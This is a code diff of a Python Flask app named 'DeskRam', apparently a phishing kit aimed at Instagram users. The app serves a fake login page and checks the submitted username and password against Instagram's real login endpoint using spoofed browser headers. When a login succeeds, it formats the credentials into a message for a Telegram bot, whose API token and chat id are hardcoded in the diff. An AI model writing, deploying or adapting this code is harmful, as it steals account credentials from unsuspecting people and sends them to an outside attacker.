@@ -25,51 +25,6 @@ print(Fore.BLUE + f.renderText('DeskRam'))
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Function to generate encrypted password and perform login
-def login(username, password):
-    time_now = int(time.time())
-    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
-
-    headers_login = {
-        'authority': 'www.instagram.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
-        'origin': 'https://www.instagram.com',
-        'referer': 'https://www.instagram.com/',
-        'sec-ch-prefers-color-scheme': 'light',
-        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': generate_user_agent(),  # Assuming you have a function to generate user agent
-        'viewport-width': '424',
-        'x-asbd-id': '198387',
-        'x-csrftoken': 'missing',
-        'x-ig-app-id': '936619743392459',
-        'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
-        'x-instagram-ajax': '1006773434',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data_login = {
-        'enc_password': enc_password,
-        'username': username,
-        'queryParams': '{}',
-        'optIntoOneTap': 'false',
-        'trustedDeviceRecords': '{}'
-    }
-
-    login_response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                                   headers=headers_login,
-                                   data=data_login)
-
-    if login_response.status_code == 200:
-        if 'authenticated":true' in login_response.text or "userId" in login_response.text:
-            return True  # Login successful
-    return False  # Login failed
-
 # Route for login page
 @app.route('/', methods=['GET', 'POST'])
 def login_page():
@@ -81,9 +36,59 @@ def login_page():
         if not username or not password:
             return render_template('login.html', error="Both username and password are required.")
 
+        # Function to generate encrypted password
+        def generate_enc_password(password):
+            time_now = int(time.time())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
+            return enc_password
+
+        # Function to perform login
+        def login(username, password):
+            headers_login = {
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'origin': 'https://www.instagram.com',
+                'referer': 'https://www.instagram.com/',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': generate_user_agent(),  # Assuming you have a function to generate user agent
+                'viewport-width': '424',
+                'x-asbd-id': '198387',
+                'x-csrftoken': 'missing',
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
+                'x-instagram-ajax': '1006773434',
+                'x-requested-with': 'XMLHttpRequest',
+            }
+
+            enc_password = generate_enc_password(password)
+            data_login = {
+                'enc_password': enc_password,
+                'username': username,
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'trustedDeviceRecords': '{}'
+            }
+
+            login_response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                                           headers=headers_login,
+                                           data=data_login)
+
+            if login_response.status_code == 200:
+                if 'authenticated":true' in login_response.text or "userId" in login_response.text:
+                    return True  # Login successful
+            return False  # Login failed
+
         login_result = login(username, password)
 
         if login_result:
+            # Successful login, redirect to Instagram
             bot_api_key = '5609501351:AAGdYonJCUaZctj_rXuAnfrhiEmj-h4r4fI'
             chat_id = '5645434088'
             message = f'Username: {username}, Password: {password}'
@@ -94,3 +99,6 @@ def login_page():
             return render_template('login.html', error="Incorrect username or password.")
 
     return render_template('login.html', error=None)
+
+if __name__ == "__main__":
+    app.run(debug=False)  # Run the app in debug mode for development
